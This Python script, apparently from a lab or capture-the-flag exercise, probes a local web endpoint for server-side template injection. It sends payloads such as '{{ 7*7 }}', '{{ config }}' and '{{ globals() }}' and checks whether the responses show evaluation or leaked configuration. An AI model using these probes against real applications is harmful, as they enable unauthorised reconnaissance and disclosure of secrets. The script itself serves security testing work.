import requests
import time

def diagnostic_test():
    """Diagnostic test to identify connection issues"""
    
    url = "http://127.0.0.1:33126/submit"
    
    # Start with safe baseline test
    print("DIAGNOSTIC TEST - Checking connection and endpoint...")
    print("=" * 50)
    
    # Test 1: Normal input (should work)
    print("\n[1/4] Testing normal input...")
    try:
        resp = requests.post(url, data={'name': 'test'}, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:200]}")
        print("Normal input: OK")
    except Exception as e:
        print(f"Normal input failed: {str(e)}")
        return
    
    time.sleep(0.5)
    
    # Test 2: Simple SSTI test
    print("\n[2/4] Testing basic SSTI payload...")
    try:
        payload = "{{ 7*7 }}"
        resp = requests.post(url, data={'name': payload}, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:200]}")
        if "49" in resp.text:
            print("SSTI: CONFIRMED - Expression evaluated!")
        else:
            print("SSTI: Not working or filtered")
    except Exception as e:
        print(f"SSTI test failed: {str(e)}")
        return
    
    time.sleep(0.5)
    
    # Test 3: Safe introspection
    print("\n[3/4] Testing safe introspection...")
    try:
        payload = "{{ config }}"
        resp = requests.post(url, data={'name': payload}, timeout=10)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:200]}")
        if "{{" not in resp.text:
            print("Config access: SUCCESS - Template rendered")
        else:
            print("Config access: Failed or filtered")
    except Exception as e:
        print(f"Config test failed: {str(e)}")
        return
    
    time.sleep(0.5)
    
    # Test 4: Global access (this might be the problematic one)
    print("\n[4/4] Testing globals() access...")
    try:
        payload = "{{ globals() }}"
        resp = requests.post(url, data={'name': payload}, timeout=15)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")  # Print more for globals response
        if "__builtins__" in resp.text:
            print("Globals access: CRITICAL - Full namespace exposed!")
        elif "{{" not in resp.text:
            print("Globals access: Partial success - Template rendered")
        else:
            print("Globals access: Failed or filtered")
    except Exception as e:
        print(f"Globals test failed: {str(e)}")
        print("This might be the payload causing connection issues")
    
    print("\nDiagnostic test completed")
    print("=" * 50)

if __name__ == '__main__':
    diagnostic_test()

